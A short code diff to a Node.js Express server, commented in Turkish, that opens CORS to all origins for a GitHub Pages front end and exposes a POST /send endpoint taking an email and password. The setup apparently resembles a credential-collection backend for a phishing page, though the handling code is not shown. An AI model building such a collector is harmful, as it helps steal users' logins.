@@ -3,9 +3,14 @@ const cors = require("cors");
 
 const app = express();
 
-app.use(cors());
+// 🔹 CORS açıyoruz, GitHub Pages ile uyumlu olsun
+app.use(cors({
+  origin: "*" // deneme için tüm domainlere izin verir
+}));
+
 app.use(express.json());
 
+// POST endpoint
 app.post("/send", (req, res) => {
   const { email, password } = req.body;
 
@@ -16,9 +21,8 @@ app.post("/send", (req, res) => {
   res.sendStatus(200);
 });
 
-// 🔥 EN ÖNEMLİ SATIR
+// Render uyumlu port
 const PORT = process.env.PORT || 3000;
-
 app.listen(PORT, () => {
   console.log("Server çalışıyor:", PORT);
 });
